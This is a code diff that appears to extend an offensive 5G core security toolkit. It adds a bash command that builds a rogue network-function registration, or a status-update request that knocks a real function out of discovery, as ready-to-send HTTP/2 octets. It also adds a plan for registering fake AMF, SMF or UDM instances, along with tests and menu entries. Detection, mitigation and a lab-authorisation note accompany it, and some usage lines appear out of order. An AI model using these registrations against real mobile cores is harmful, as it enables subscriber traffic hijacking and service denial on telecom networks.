@@ -1196,6 +1196,197 @@ sbap_n32_bridge() {
     return 0
 }
 
+# ── NRF registration: the request a rogue NF actually puts on the wire ──
+# TS 29.510 §5.2 fixes both verbs: NFRegister is
+# PUT /nnrf-nfm/v1/nf-instances/{nfInstanceId} with an NFProfile as the body,
+# and NFUpdate is PATCH on the same resource with a JSON patch. The NFProfile
+# fields used below (nfInstanceId, nfType, nfStatus, ipv4Addresses, fqdn,
+# nfServices) are the ones §6.1 defines. TS 33.501 §13.4 is why any of this
+# should fail: the SBI runs over TLS with mutual authentication and the
+# registration carries an OAuth2 token whose scope is nnrf-nfm.
+#
+# The bytes built here are real HTTP/2 (RFC 7540 §4, §6.2, §6.9): the
+# connection preface, a HEADERS frame whose payload is a literal HPACK header
+# block (RFC 7541 §6.2.2, the "without indexing, new name" form), and a DATA
+# frame carrying the JSON. Nothing is sent, and no row below claims it was.
+sbap_ascii_hex() {  # <ascii> -> hex
+    local s="${1:-}" out="" i
+    for (( i = 0; i < ${#s}; i++ )); do out+=$(printf '%02X' "'${s:$i:1}"); done
+    printf '%s' "$out"
+}
+
+# RFC 7541 §5.1: an integer in an N-bit prefix. A value below 2^N-1 fits in the
+# octet itself; anything larger continues in 7-bit groups with the high bit set.
+sbap_hpack_int() {  # <value> <prefix bits>
+    local v="${1:-0}" n="${2:-7}" max out
+    max=$(( (1 << n) - 1 ))
+    if (( v < max )); then printf '%02X' "$v"; return 0; fi
+    out=$(printf '%02X' "$max"); v=$(( v - max ))
+    while (( v >= 128 )); do
+        out+=$(printf '%02X' "$(( (v & 0x7F) | 0x80 ))"); v=$(( v >> 7 ))
+    done
+    out+=$(printf '%02X' "$v")
+    printf '%s' "$out"
+}
+
+# RFC 7541 §6.2.2: literal header field without indexing, new name. The first
+# octet is 0000 0000, then the name length with H (huffman) clear, the name,
+# the value length with H clear, and the value. Huffman coding is optional in
+# that form, so a decoder that ignores H must read this back exactly.
+sbap_hpack_literal() {  # <name> <value> -> header block hex
+    local n="${1:-}" v="${2:-}" h="00"
+    [[ -n "$n" ]] || { printf 'ERROR\ta header name is required\n' >&2; return 2; }
+    h+="$(sbap_hpack_int "${#n}" 7)$(sbap_ascii_hex "$n")"
+    h+="$(sbap_hpack_int "${#v}" 7)$(sbap_ascii_hex "$v")"
+    printf '%s' "$h"
+}
+
+# The preface of RFC 7540 §3.5, and the profile body of TS 29.510 §6.1.
+sbap_cmd_nrf_register() {
+    local nftype="" inst="" fqdn="" ipv4="203.0.113.9" port="8080"
+    local capacity="" priority="" status="REGISTERED" method="PUT" token=""
+    local authority="" service="" patch=""
+    while (( $# > 0 )); do
+        case "$1" in
+            --nf-type)   nftype="${2:-}";   shift $(( $# >= 2 ? 2 : 1 )) ;;
+            --instance)  inst="${2:-}";     shift $(( $# >= 2 ? 2 : 1 )) ;;
+            --fqdn)      fqdn="${2:-}";     shift $(( $# >= 2 ? 2 : 1 )) ;;
+            --ip)        ipv4="${2:-}";     shift $(( $# >= 2 ? 2 : 1 )) ;;
+            --port)      port="${2:-}";     shift $(( $# >= 2 ? 2 : 1 )) ;;
+            --capacity)  capacity="${2:-}"; shift $(( $# >= 2 ? 2 : 1 )) ;;
+            --priority)  priority="${2:-}"; shift $(( $# >= 2 ? 2 : 1 )) ;;
+            --status)    status="${2:-}";   shift $(( $# >= 2 ? 2 : 1 )) ;;
+            --service)   service="${2:-}";  shift $(( $# >= 2 ? 2 : 1 )) ;;
+            --authority) authority="${2:-}"; shift $(( $# >= 2 ? 2 : 1 )) ;;
+            --token)     token="${2:-}";    shift $(( $# >= 2 ? 2 : 1 )) ;;
+            --patch)     patch=1; method="PATCH"; shift ;;
+            --register)  patch=""; method="PUT"; shift ;;
+            -*) printf 'ERROR\t--nrf-register does not take %s (see --help)\n' "$(sbap_sanitize "$1")" >&2; return 2 ;;
+            *)  printf 'ERROR\t--nrf-register takes flags only, no positionals (got %s)\n' "$(sbap_sanitize "$1")" >&2; return 2 ;;
+        esac
+    done
+    # The one field that decides what the rogue instance claims. It has no
+    # default on purpose: a registration that quietly says AMF when the caller
+    # meant SMF is the wrong request, not a defaulted one.
+    [[ -n "$nftype" ]] || { printf 'ERROR\t--nf-type is required: it is the field that decides what this instance claims to be, and a registration with no nfType is rejected by any NRF (TS 29.510 6.1)\n' >&2; return 2; }
+    if [[ -n "$capacity" ]] && ! [[ "$capacity" =~ ^[0-9]+$ ]]; then
+        printf 'ERROR\t--capacity takes a whole number of load units (TS 29.510 6.1, capacity is an integer), got "%s"\n' "$(sbap_sanitize "$capacity")" >&2
+        return 2
+    fi
+    if [[ -n "$priority" ]] && ! [[ "$priority" =~ ^[0-9]+$ ]]; then
+        printf 'ERROR\t--priority takes a whole number (TS 29.510 6.1, priority is an integer), got "%s"\n' "$(sbap_sanitize "$priority")" >&2
+        return 2
+    fi
+    if ! [[ "$ipv4" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]]; then
+        printf 'ERROR\t--ip takes a dotted IPv4 address (ipv4Addresses is an array of IpAddr, TS 29.510 6.1), got "%s"\n' "$(sbap_sanitize "$ipv4")" >&2
+        return 2
+    fi
+    [[ -n "$inst" ]] || inst="5e2b1c00-9f0a-4d33-8a77-1b9f0e6a4c11"
+    if [[ -n "$capacity" && ! "$capacity" =~ ^[0-9]+$ ]]; then
+        printf 'ERROR\t--capacity is an integer 0..255 in an NFProfile (TS 29.510 §6.1), got %s\n' "$(sbap_sanitize "$capacity")" >&2
+        return 2
+    fi
+    if [[ -n "$priority" && ! "$priority" =~ ^[0-9]+$ ]]; then
+        printf 'ERROR\t--priority is an integer in an NFProfile (TS 29.510 §6.1), got %s\n' "$(sbap_sanitize "$priority")" >&2
+        return 2
+    fi
+    if [[ ! "$port" =~ ^[0-9]+$ ]] || (( port < 1 || port > 65535 )); then
+        printf 'ERROR\t--port must be 1..65535, got %s\n' "$(sbap_sanitize "$port")" >&2
+        return 2
+    fi
+    if [[ ! "$ipv4" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+        printf 'ERROR\t--ip must be a dotted-quad IPv4 address, got %s\n' "$(sbap_sanitize "$ipv4")" >&2
+        return 2
+    fi
+    local lower; lower=$(printf '%s' "$nftype" | tr 'A-Z' 'a-z')
+    [[ -n "$service" ]] || service="n${lower}"
+    [[ -n "$fqdn" ]] || fqdn="$(printf '%s' "$lower").5gc.mnc001.mcc001.3gppnetwork.org"
+    [[ -n "$authority" ]] || authority="nrf.5gc.mnc001.mcc001.3gppnetwork.org"
+    local body path
+    path="/nnrf-nfm/v1/nf-instances/$inst"
+    if [[ -n "$patch" ]]; then
+        # TS 29.510 §5.2: NFUpdate is a PATCH whose body is the JSON patch,
+        # which is how a real instance is taken out of discovery without a
+        # packet ever being sent to it.
+        body=$(printf '{"nfStatus":"%s"}' "$status")
+    else
+        local extra=""
+        [[ -z "$capacity" ]] || extra+=",\"capacity\":${capacity}"
+        [[ -z "$priority" ]] || extra+=",\"priority\":${priority}"
+        body=$(printf '{"nfInstanceId":"%s","nfType":"%s","nfStatus":"%s","ipv4Addresses":["%s"],"fqdn":"%s","nfServices":[{"serviceInstanceId":"%s-1","serviceName":"%s","versions":[{"apiVersionInUri":"v1","apiFullVersion":"1.0.0","expiry":"2027-01-01T00:00:00Z"}],"scheme":"http","nfServiceStatus":"%s","ipEndPoints":[{"ipv4Address":"%s","port":%s,"transport":"TCP"}]}]%s}' \
+            "$inst" "$nftype" "$status" "$ipv4" "$fqdn" "$lower" "$service" "$status" "$ipv4" "$port" "$extra")
+    fi
+    local hb=""
+    hb+=$(sbap_hpack_literal ":method" "$method")
+    hb+=$(sbap_hpack_literal ":scheme" "https")
+    hb+=$(sbap_hpack_literal ":authority" "$authority")
+    hb+=$(sbap_hpack_literal ":path" "$path")
+    hb+=$(sbap_hpack_literal "content-type" "application/json")
+    hb+=$(sbap_hpack_literal "accept" "application/json")
+    [[ -z "$token" ]] || hb+=$(sbap_hpack_literal "authorization" "Bearer $token")
+    local body_hex hf df preface
+    body_hex=$(sbap_ascii_hex "$body")
+    # HEADERS with END_HEADERS (0x04) and no END_STREAM, because a DATA frame
+    # follows; the DATA frame carries END_STREAM (0x01). Stream 1 is the first
+    # client-initiated stream (RFC 7540 §5.1.1).
+    hf=$(sbap_h2_build 1 4 1 "$hb")
+    df=$(sbap_h2_build 0 1 1 "$body_hex")
+    preface=$(sbap_ascii_hex $'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
+
+    printf 'method\t%s\n' "$method"
+    printf 'path\t%s\n' "$path"
+    printf 'authority\t%s\n' "$authority"
+    printf 'scheme\thttps\n'
+    printf 'content_type\tapplication/json\n'
+    printf 'nf_type\t%s\n' "$nftype"
+    printf 'nf_instance_id\t%s\n' "$inst"
+    printf 'nf_status\t%s\n' "$status"
+    printf 'claimed_fqdn\t%s\n' "$fqdn"
+    printf 'claimed_address\t%s:%s\n' "$ipv4" "$port"
+    printf 'claimed_service\t%s\n' "$service"
+    if [[ -n "$token" ]]; then
+        printf 'authorization\tBearer <token as given, %s octets>\n' "${#token}"
+    else
+        printf 'unobserved\tauthorization\tno --token was given, so this request is the one an NRF accepts when it does not enforce OAuth2 (TS 33.501 §13.4); whether the target does is not observable from here\n'
+    fi
+    printf 'body\t%s\n' "$body"
+    printf 'hpack_block\t%s\n' "$hb"
+    printf 'headers_frame\t%s\n' "$hf"
+    printf 'data_frame\t%s\n' "$df"
+    printf 'preface_hex\t%s\n' "$preface"
+    printf 'request_octets\t%s\n' "$(( (${#preface} + ${#hf} + ${#df}) / 2 ))"
+    printf 'request_hex\t%s%s%s\n' "$preface" "$hf" "$df"
+    printf 'what_discovery_returns\t%s\n' "every NF that asks the NRF for $nftype now receives this instance beside the real one, and a client with no preference takes the first"
+    printf 'requires\t%s\n' "an NRF that accepts a registration without a client certificate bound to the instance and without the nnrf-nfm scope in the access token (TS 33.501 §13.4)"
+    printf 'unobserved\tframing\tthe octets start at the connection preface; a real SBI connection interleaves SETTINGS, runs inside TLS 1.2/1.3 with mutual certificates and negotiates ALPN h2, none of which this build can observe or claim\n'
+    printf 'verdict\tadvertised (built here, sent nowhere)\n'
+    printf 'finding\tnrf_register_not_bound\tHIGH\n'
+    printf 'ref\t%s\n' "TS 29.510 §5.2 (NFRegister/NFUpdate), §6.1 (NFProfile); RFC 7540 §3.5, §6.2, §9.2; RFC 7541 §5.1, §6.2.2"
+    return 0
+}
+
+# What a rogue NF can register, and what each registration changes for the NFs
+# that discover it. This is a handoff: the flow needs a core to run against, so
+# the verb writes the plan and returns 3 rather than pretending it ran.
+sbap_nrf_register_plan() {
+    cat <<'EOF'
+status	handoff
+what	registering an NF into a live NRF, and what each registration changes for the NFs that discover it
+build	modules/40_sba_pivot.sh --nrf-register --nf-type <AMF|SMF|UDM|AUSF|UPF> [--ip <addr>] [--fqdn <name>] [--token <jwt>]
+build_update	modules/40_sba_pivot.sh --nrf-register --patch --instance <uuid> --status SUSPENDED
+hardware	a 5G SA testbed: Open5GS or free5GC on a host, optionally with srsRAN gNB and a UE
+software	Open5GS (NRF/AMF/AUSF/UDM/SMF), curl or grpcurl, a client certificate for the SBI when mTLS is on
+flow	1. build the registration here  2. send it from an authorised client inside the lab core  3. ask the NRF for the same nfType and see which instance a discovering NF gets back  4. take the real instance out with --patch and watch the next discovery answer change
+registers	an instance that answers discovery: a fake AMF, SMF, UDM, AUSF or UPF whose address is the attacker's, so the next NF that asks for that type may talk to it
+registers	stale: a PATCH to SUSPENDED on a real instance removes it from discovery with no packet sent to it
+registers	authority: an instance whose nfServices claim a service the real NF does not offer (nnrf-disc, nudm-sdm, nausf-auth), which is how a discovery client is steered at the wrong API
+detect	an NF instance whose FQDN and address disagree; a registration whose source address is outside the core network plan; two instances for one nfType with one of them newly created
+mitigate	TS 33.501 §13.4 mutual TLS on the SBI, the nnrf-nfm scope checked per registration, and an NRF that binds an instance to the certificate it registered with
+note	against a production core this needs that operator's authorisation; this module builds the request and sends nothing
+EOF
+    return 3
+}
+
 sbap_selftest() {
     local bad=0 nchk=0
     chk() {
@@ -1458,6 +1649,54 @@ sbap_selftest() {
     sbap_cmd_n32_build --method GET --path /x --authority h \
         --encrypt-header 'a=b' --key "$zkey" --iv "$ziv" --context zz >/dev/null 2>&1
     chk n32-bad-context   "$?" "2"
+    # NRF registration: the HPACK integer form and the literal field are what
+    # everything else rests on, so they are asserted as octets, then the frames
+    # and the body are checked through the parsers already in this file.
+    chk hpack-int-10       "$(sbap_hpack_int 10 7)" "0A"
+    chk hpack-int-300      "$(sbap_hpack_int 300 7)" "7FAD01"
+    chk hpack-literal      "$(sbap_hpack_literal ":method" "PUT")" "00073A6D6574686F6403505554"
+    chk hpack-literal-long "$(sbap_hpack_literal ":authority" "$(printf 'a%.0s' $(seq 1 130))" | cut -c1-6)" "000A3A"
+    out=$(sbap_cmd_nrf_register --nf-type SMF --capacity 100 --priority 3)
+    chk nrf-method         "$(fld "$out" method)" "PUT"
+    chk nrf-path-suffix    "$(fld "$out" path | cut -c1-20)" "/nnrf-nfm/v1/nf-inst"
+    chk nrf-content-type   "$(fld "$out" content_type)" "application/json"
+    chk nrf-preface        "$(fld "$out" preface_hex)" "505249202A20485454502F322E300D0A0D0A534D0D0A0D0A"
+    hb=$(fld "$out" hpack_block)
+    # The header block must be exactly what this file's own HPACK decoder reads
+    # back: six fields, and the method the caller asked for.
+    chk nrf-hpack-count    "$(sbap_hpack_decode "$hb" hdr | awk -F'\t' '$1=="hdr.count"{print $2}')" "6"
+    chk nrf-hpack-method   "$(sbap_hpack_decode "$hb" hdr | awk -F'\t' '$1=="hdr.0.value"{print $2}')" "PUT"
+    # HEADERS carries END_HEADERS and no END_STREAM; DATA carries END_STREAM.
+    hf=$(fld "$out" headers_frame)
+    chk nrf-headers-type   "$(sbap_h2_parse "$hf" | awk -F'\t' '$1=="type_name"{print $2}')" "HEADERS"
+    chk nrf-headers-flags  "$(sbap_h2_parse "$hf" | awk -F'\t' '$1=="flags"{print $2}')" "0x04"
+    chk nrf-headers-length "$(sbap_h2_parse "$hf" | awk -F'\t' '$1=="length"{print $2}')" "$(( ${#hb} / 2 ))"
+    df=$(fld "$out" data_frame)
+    chk nrf-data-type      "$(sbap_h2_parse "$df" | awk -F'\t' '$1=="type_name"{print $2}')" "DATA"
+    chk nrf-data-flags     "$(sbap_h2_parse "$df" | awk -F'\t' '$1=="flags"{print $2}')" "0x01"
+    chk nrf-data-stream    "$(sbap_h2_parse "$df" | awk -F'\t' '$1=="stream_id"{print $2}')" "1"
+    # preface + HEADERS frame + DATA frame, in octets: the frames already carry
+    # their own nine-octet headers, so the body is inside them once.
+    chk nrf-request-octets "$(fld "$out" request_octets)" \
+        "$(( (48 + ${#hf} + ${#df}) / 2 ))"
+    chk nrf-body-nftype    "$(fld "$out" body | grep -c '\"nfType\":\"SMF\"')" "1"
+    chk nrf-capacity       "$(fld "$out" body | grep -c '\"capacity\":100')" "1"
+    chk nrf-no-token       "$(printf '%s\n' "$out" | awk -F'\t' '$1=="unobserved"{print $2; exit}')" "authorization"
+    chk nrf-token-row      "$(sbap_cmd_nrf_register --nf-type AMF --token abc.def.ghi | awk -F'\t' '$1=="authorization"{print $1}')" "authorization"
+    # TS 29.510 5.2 second verb: the update is a PATCH that carries the status.
+    out=$(sbap_cmd_nrf_register --nf-type UDM --patch --status SUSPENDED)
+    chk nrf-patch-method   "$(fld "$out" method)" "PATCH"
+    chk nrf-patch-body     "$(fld "$out" body)" '{"nfStatus":"SUSPENDED"}'
+    # Every refusal names what is missing, and none of them exits 0.
+    sbap_cmd_nrf_register >/dev/null 2>&1; chk nrf-guard-nftype "$?" "2"
+    sbap_cmd_nrf_register --nf-type AMF --capacity x >/dev/null 2>&1; chk nrf-guard-capacity "$?" "2"
+    sbap_cmd_nrf_register --nf-type AMF --ip 10.0.0 >/dev/null 2>&1; chk nrf-guard-ip "$?" "2"
+    sbap_cmd_nrf_register --nf-type AMF --bogus 1 >/dev/null 2>&1; chk nrf-guard-flag "$?" "2"
+    sbap_cmd_nrf_register AMF >/dev/null 2>&1; chk nrf-guard-positional "$?" "2"
+    # The plan is a handoff: exit 3, and it says so in its own first row.
+    pl=$(sbap_nrf_register_plan); chk nrf-plan-rc "$?" "3"
+    chk nrf-plan-status    "$(printf '%s\n' "$pl" | awk -F'\t' '$1=="status"{print $2}')" "handoff"
+    chk nrf-plan-registers "$(printf '%s\n' "$pl" | grep -c '^registers	')" "3"
     printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
     return $(( bad > 0 ))
 }
@@ -1476,6 +1715,8 @@ sbap_menu() {
   [6]  SBI path reference
   [7]  Decode a JWT
   [8]  Audit a JWT
+  [10] Build an NRF registration (NFRegister / NFUpdate)
+  [11] Plan: what a rogue NF can register
   [9]  Plan (handoff)
   [0]  back
 M
@@ -1491,6 +1732,12 @@ M
             6) sbap_nf_paths; read -rp "  enter " _ ;;
             7) read -rp "  jwt> " t; sbap_jwt_decode "$t"; read -rp "  enter " _ ;;
             8) read -rp "  jwt> " t; read -rp "  expected aud> " a; sbap_jwt_audit "$t" "$a"; read -rp "  enter " _ ;;
+            10) if [[ -n "${IMSISTING_CLI:-}" ]]; then echo "[-] needs flags; use --nrf-register in CLI mode" >&2
+                else read -rp "  nf type (AMF/SMF/UDM/AUSF)> " p
+                     read -rp "  address to claim> " a
+                     sbap_cmd_nrf_register --nf-type "${p:-AMF}" --ip "${a:-203.0.113.9}"
+                     read -rp "  enter " _; fi ;;
+            11) sbap_nrf_register_plan; read -rp "  enter " _ ;;
             9) sbap_plan; read -rp "  enter " _ ;;
             0) return ;;
             *) warn "invalid"; sleep 1 ;;
@@ -1863,6 +2110,8 @@ sbap_cli_main() {
         --imds-pivot)  sbap_imds_pivot "${1:-SMF}" "${2:-}" ;;
         --nrf-walk)    sbap_nrf_walk "${1:-}" "${2:-AMF}" ;;
         --nrf-poison)  sbap_nrf_poison "${1:-AMF}" "${2:-}" "${3:-}" ;;
+        --nrf-register)      sbap_cmd_nrf_register "$@" ;;
+        --nrf-register-plan) sbap_nrf_register_plan ;;
         --nef-apis)    sbap_nef_events "${1:-all}" ;;
         --nwdaf)       sbap_nwdaf_sub "${1:-all}" ;;
         --plan)        sbap_plan ;;
@@ -1891,6 +2140,17 @@ Usage: $0 COMMAND
   --n32-bridge <home-api-root> [visiting-NF] [plmn]
   --imds-pivot [NF] [url]  C8: a registered callback that points the
   --nrf-walk [nrf-host] [requester]
+  --nrf-register --nf-type <NF> [--instance <uuid>] [--fqdn <name>]
+                 [--ip <addr>] [--port <n>] [--capacity <n>] [--priority <n>]
+                 [--service <name>] [--authority <host>] [--token <jwt>]
+                 [--patch [--status <STATUS>]]
+                        build the NFRegister PUT (or the NFUpdate PATCH) as real
+                        HTTP/2: connection preface, HEADERS frame with a literal
+                        HPACK block, and the NFProfile JSON in a DATA frame
+                        (TS 29.510 5.2, RFC 7540/7541). Sends nothing.
+  --nrf-register-plan   handoff: what a rogue NF can register, and what each
+                        registration changes for the NFs that discover it
+                        (exit 3: a handoff, not a failure)
                         C3: the thirteen discovery requests that
                         return the whole core as JSON
                         SBI client at the cloud metadata service
